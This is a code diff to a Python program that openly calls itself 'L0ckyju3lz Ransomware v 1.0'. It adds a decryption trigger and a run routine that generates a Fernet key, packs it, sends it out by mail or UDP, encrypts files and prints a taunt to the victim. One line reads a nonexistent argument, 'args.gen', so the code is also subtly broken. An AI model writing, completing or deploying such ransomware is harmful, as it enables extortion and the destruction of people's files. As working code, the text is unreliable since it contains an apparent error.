@@ -8,6 +8,11 @@ import socket
 import re
 from os.path import expanduser
 from cryptography.fernet import Fernet
+from argparse import ArgumentParser
+
+parser = ArgumentParser(description="L0ckyju3lz Ransomware v 1.0")
+parser.add_argument("-decf", dest="dec", metavar="Decryption")
+args = parser.parse_args()
 
 class L0ckyju3lz():
 
@@ -17,9 +22,11 @@ class L0ckyju3lz():
         self.key = None
         self.crypt = None
         self.archiv_name = None
-        self.file_ext_targets = ['txt']
         self.client_ID = None
         self.root_tree = None
+
+        # Decrypt
+        self.dec_key = args.gen
 
         # Program Details
         self.author = "PiereLucas"
@@ -65,7 +72,7 @@ class L0ckyju3lz():
         return True
 
     def read_key(self):
-        with open("*.lockyjuelz-key", 'rb') as f:
+        with open(self.dec_key, 'rb') as f:
             self.key = f.read()
         self.crypt = Fernet(self.key)
         return True
@@ -90,6 +97,7 @@ class L0ckyju3lz():
         return True
 
     def send_key(self):
+        # Try two methods
         if self.over_mail(): return True
         elif self.over_udp_client(): return True
         else: return False
@@ -169,7 +177,35 @@ class L0ckyju3lz():
             return True
 
     def run(self):
-        pass
+        # Check Decryption Trigger
+        if args.dec:
+            if self.read_key():
+                if self.crypt_file(mode='dec'):
+                    print("Stop crying little Baby ...")
+                else:
+                    print("Wrong Key")
+                    sys.exit(0)
+        else: pass
+
+        # Check User
+        self.is_root_dir()
+        # gen Key
+        if self.gen_key(): pass
+        else: sys.exit(0)
+        # pack key
+        if self.pack_key(): pass
+        else: sys.exit(0)
+        # send key
+        if self.send_key(): pass
+        else: sys.exit(0)
+        # crypt
+        if self.crypt_file(mode='enc'):
+            del self.crypt
+            del self.key
+            print("Start crying little baby ...")
+        else:
+            sys.exit(0)
+
 
 if __name__ == "__main__":
     lj = L0ckyju3lz()
